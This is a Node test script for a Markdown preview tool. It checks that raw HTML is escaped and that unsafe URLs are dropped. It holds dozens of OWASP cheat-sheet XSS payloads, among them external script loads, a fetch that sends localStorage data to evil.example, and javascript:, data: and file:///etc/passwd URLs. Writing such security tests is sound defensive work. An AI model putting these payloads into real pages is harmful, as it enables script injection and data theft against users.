// Markdown Preview — CommonMark + GFM rendering, raw HTML escaped, unsafe URLs dropped
//
// Read:  src/components/tools/MarkdownPreviewTool.astro (extracts the real engine block
//        between the `engine:start` / `engine:end` markers, so this test cannot drift
//        from the shipped source); src/content/tools/markdown-preview/{en,zh,ja,ko}.mdx
//        (the example input and the HTML the pages say it produces)
// Write: stdout only (test results)
// Exit:  0 if all PASS, 1 if any FAIL
//
// The engine gets micromark and the GFM extension from node_modules, as the component does
// through its imports. Every output is parsed with parse5 (the HTML parser Astro already
// depends on) and checked structurally: only elements that Markdown itself produces, no
// on* attributes, no style attribute, and every href / src is http(s), mailto, relative or a
// fragment. The attack inputs are the vectors from the OWASP XSS Filter Evasion Cheat Sheet
// (raw tags, event handlers, javascript: with entities / tabs / case / whitespace, data:,
// vbscript:, SVG and MathML script, iframe / object / embed / style / meta / base) written both
// as raw HTML and inside Markdown link and image syntax.
//
// Run: node scripts/test-markdown-preview.mjs

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { micromark } from 'micromark';
import { gfm, gfmHtml } from 'micromark-extension-gfm';
import { parseFragment } from 'parse5';
// Timing limits catch order-of-magnitude regressions; CI runners are several times slower than a dev machine.
const PERF_SLACK = process.env.CI ? 4 : 1;

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const source = readFileSync(join(root, 'src/components/tools/MarkdownPreviewTool.astro'), 'utf8');

const START_MARK = '/* ── engine:start ── */';
const END_MARK = '/* ── engine:end ── */';
const startIndex = source.indexOf(START_MARK);
const endIndex = source.indexOf(END_MARK);
if (startIndex < 0 || endIndex <= startIndex) {
  console.error('FAIL: could not locate the engine block in MarkdownPreviewTool.astro');
  process.exit(1);
}
const block = source.slice(startIndex, endIndex);
const E = new Function(block + '\nreturn { renderMarkdown };')();
const lib = { micromark, gfm, gfmHtml };
const render = (md) => E.renderMarkdown(md, lib);

let failures = 0;
let passes = 0;
function check(name, ok, detail) {
  if (ok) { passes++; return; }
  failures++;
  console.log('FAIL: ' + name + (detail !== undefined ? ' — ' + detail : ''));
}
function eq(name, actual, expected) {
  check(name, actual === expected, 'got ' + JSON.stringify(actual) + ', expected ' + JSON.stringify(expected));
}
function has(name, html, fragment) {
  check(name, html.includes(fragment), 'missing ' + JSON.stringify(fragment) + ' in ' + JSON.stringify(html));
}

// Elements that CommonMark + GFM can produce. Anything else in the output came from raw HTML.
const MARKDOWN_TAGS = new Set([
  'p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'em', 'strong', 'del', 'code', 'pre', 'a', 'img',
  'ul', 'ol', 'li', 'blockquote', 'hr', 'br', 'table', 'thead', 'tbody', 'tr', 'th', 'td',
  'input', 'section', 'sup',
]);
const SAFE_URL = /^(https?:|mailto:|#|\/|\.|[^:]*$)/i;

function walk(node, visit) {
  visit(node);
  for (const child of node.childNodes || []) walk(child, visit);
  if (node.content) walk(node.content, visit);
}
function unsafeParts(html) {
  const problems = [];
  walk(parseFragment(html), (node) => {
    if (!node.tagName) return;
    if (!MARKDOWN_TAGS.has(node.tagName)) problems.push('<' + node.tagName + '>');
    for (const attr of node.attrs || []) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) problems.push(name + '=');
      if (name === 'style' || name === 'srcdoc' || name === 'formaction') problems.push(name + '=');
      if (name === 'href' || name === 'src') {
        // Browsers ignore ASCII tab / newline and leading control characters and spaces in URLs.
        const url = attr.value.replace(/[\t\n\r]/g, '').replace(/^[\u0000-\u0020]+/, '');
        if (url && !SAFE_URL.test(url)) problems.push(name + '=' + JSON.stringify(attr.value));
      }
    }
    if (node.tagName === 'input') {
      const type = (node.attrs.find((a) => a.name === 'type') || {}).value;
      const disabled = node.attrs.some((a) => a.name === 'disabled');
      if (type !== 'checkbox' || !disabled) problems.push('<input> that is not a disabled checkbox');
    }
  });
  return problems;
}
function safe(name, md) {
  const html = render(md);
  const problems = unsafeParts(html);
  check('safe: ' + name, problems.length === 0, problems.join(', ') + ' in ' + JSON.stringify(html));
  return html;
}

// ---------- the reported defect: raw HTML ran in the page ----------
{
  const html = safe('img onerror in a paragraph', 'Hello <img src=x onerror=alert(1)> world');
  has('raw <img> is shown as text', html, '&lt;img src=x onerror=alert(1)&gt;');
}
safe('raw HTML block', '<div>\n<img src=x onerror="fetch(\'//evil.example/?\'+localStorage.length)">\n</div>');

// OWASP XSS Filter Evasion Cheat Sheet vectors, as raw HTML (block and inline).
const OWASP = [
  '<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>',
  '<script>alert(1)</script>',
  '<IMG SRC="javascript:alert(\'XSS\');">',
  '<IMG SRC=javascript:alert(\'XSS\')>',
  '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
  '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
  '<a onmouseover="alert(document.cookie)">xxs link</a>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>',
  '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">',
  '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  '<IMG SRC="jav\tascript:alert(\'XSS\');">',
  '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
  '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
  '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>',
  '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>',
  '<<SCRIPT>alert("XSS");//\\<</SCRIPT>',
  '<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
  '<iframe src=http://xss.rocks/scriptlet.html <',
  '<svg/onload=alert(\'XSS\')>',
  '<svg><script>alert(1)</script></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
  '<IMG DYNSRC="javascript:alert(\'XSS\')">',
  '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>',
  '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
  '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
  '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
  '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
  '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
  '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
  '<DIV STYLE="width: expression(alert(\'XSS\'));">',
  '<BASE HREF="javascript:alert(\'XSS\');//">',
  '<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>',
  '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
  '<a href="javascript:alert(1)">x</a>',
  '<form><button formaction=javascript:alert(1)>x</button></form>',
  '<details open ontoggle=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<!--><img src=x onerror=alert(1)>-->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
];
OWASP.forEach((v, i) => {
  safe('OWASP vector ' + (i + 1) + ' as a block', v);
  safe('OWASP vector ' + (i + 1) + ' inline', 'text ' + v + ' text');
  safe('OWASP vector ' + (i + 1) + ' in a list item', '- ' + v);
  safe('OWASP vector ' + (i + 1) + ' in a table cell', '| a |\n|---|\n| ' + v.replace(/\|/g, '\\|') + ' |');
});

// Dangerous URLs written with Markdown syntax instead of raw HTML.
const BAD_URLS = [
  'javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'javascript&#58;alert(1)', 'javascript&colon;alert(1)',
  '&#106;avascript:alert(1)', 'java%0ascript:alert(1)', 'vbscript:msgbox(1)',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'data:image/svg+xml,<svg onload=alert(1)>',
  'file:///etc/passwd', ' javascript:alert(1)',
];
for (const url of BAD_URLS) {
  safe('inline link ' + url, '[click](' + url.replace(/ /g, '%20') + ')');
  safe('angle-bracket link ' + url, '[click](<' + url + '>)');
  safe('image ' + url, '![x](' + url.replace(/ /g, '%20') + ')');
  safe('reference link ' + url, '[click][r]\n\n[r]: <' + url + '>');
  safe('autolink ' + url, '<' + url + '>');
}
safe('link title cannot break out of the attribute', '[x](https://a.example "t\\" onmouseover=\\"alert(1))');
safe('image alt cannot break out of the attribute', '![a" onerror="alert(1)](https://a.example/x.png)');
safe('code fence info string cannot inject attributes', '```js" onclick="alert(1)\nx\n```');
safe('footnote label', 'a[^<img src=x onerror=alert(1)>]\n\n[^<img src=x onerror=alert(1)>]: b');

{
  const html = render('[x](javascript:alert(1))');
  eq('javascript: link keeps its text and gets an empty href', html, '<p><a href="">x</a></p>');
  eq('https link is kept', render('[x](https://example.com/a?b=1&c=2)'), '<p><a href="https://example.com/a?b=1&amp;c=2">x</a></p>');
  eq('relative link is kept', render('[x](./docs/a.md#b)'), '<p><a href="./docs/a.md#b">x</a></p>');
  eq('mailto link is kept', render('<mailto:a@example.com>'), '<p><a href="mailto:a@example.com">mailto:a@example.com</a></p>');
  eq('https image is kept (it loads from the network)', render('![logo](https://example.com/logo.png)'), '<p><img src="https://example.com/logo.png" alt="logo" /></p>');
  eq('data: image is dropped', render('![d](data:image/png;base64,iVBORw0KGgo=)'), '<p><img src="" alt="d" /></p>');
}

// ---------- the other parser defects listed by the batch-04 audit ----------
eq('** inside a code span stays literal', render('`a **b** c`'), '<p><code>a **b** c</code></p>');
eq('** inside a fenced block stays literal', render('```\na **b**\n```'), '<pre><code>a **b**\n</code></pre>');
eq('nested list', render('- Parent\n  - Child'), '<ul>\n<li>Parent\n<ul>\n<li>Child</li>\n</ul>\n</li>\n</ul>');
has('capital [X] is a checked task', render('- [X] Done'), '<input type="checkbox" disabled="" checked="" /> Done');
eq('ordered list keeps its start number', render('3. third\n4. fourth'), '<ol start="3">\n<li>third</li>\n<li>fourth</li>\n</ol>');
{
  const html = render('| Item | Price |\n|:-----|------:|\n| Widget | $9.99 |\n| a \\| b | 1 |');
  has('left alignment', html, '<th align="left">Item</th>');
  has('right alignment', html, '<th align="right">Price</th>');
  has('escaped pipe stays in one cell', html, '<td align="left">a | b</td>');
}
has('bare URL becomes a link (GFM autolink literal)', render('See https://example.com.'), '<a href="https://example.com">https://example.com</a>.');
has('www autolink', render('www.example.com'), '<a href="http://www.example.com">www.example.com</a>');
has('reference-style link', render('[a][b]\n\n[b]: https://example.com'), '<a href="https://example.com">a</a>');
has('footnote', render('Text[^1]\n\n[^1]: Note'), 'Note');
has('strikethrough', render('~~gone~~'), '<del>gone</del>');
has('fenced code language class', render('```js\nx\n```'), '<code class="language-js">');
has('hard line break', render('a  \nb'), 'a<br />\nb');
has('setext heading', render('Title\n=====\n'), '<h1>Title</h1>');
has('lazy blockquote continuation', render('> a\nb'), '<blockquote>\n<p>a\nb</p>\n</blockquote>');
eq('empty input', render(''), '');
has('entities pass through as text', render('AT&T &copy; &lt;b&gt;'), 'AT&amp;T © &lt;b&gt;');

// ---------- the example on the tool pages ----------
for (const lang of ['en', 'zh', 'ja', 'ko']) {
  const mdx = readFileSync(join(root, 'src/content/tools/markdown-preview/' + lang + '.mdx'), 'utf8');
  const input = mdx.match(/````markdown\n([\s\S]*?)\n````/);
  const output = mdx.match(/```html\n([\s\S]*?)\n```/);
  check(lang + ': page has the example input and output', !!(input && output));
  if (input && output) eq(lang + ': example output is what the engine produces', render(input[1]), output[1]);
}

// ---------- the component wires the engine and keeps the copy safe ----------
check('component imports micromark and the GFM extension',
  /from 'micromark'/.test(source) && /from 'micromark-extension-gfm'/.test(source));
check('component no longer has the hand-written parser', !/function parseMarkdown/.test(source));
check('engine does not allow dangerous HTML or protocols',
  !/allowDangerousHtml:\s*true/.test(block) && !/allowDangerousProtocol:\s*true/.test(block));

// ---------- size and speed ----------
{
  const big = Array.from({ length: 2000 }, (_, i) => '## H' + i + '\n\nText **b** `c` [l](https://e.example/' + i + ')\n\n- a\n  - b\n').join('\n');
  const t0 = performance.now();
  render(big);
  const ms = performance.now() - t0;
  check('2,000 sections render in under 1.5 s', ms < 1500 * PERF_SLACK, ms.toFixed(0) + ' ms');
}

console.log(`\n${passes} passed, ${failures} failed`);
process.exit(failures ? 1 : 0);
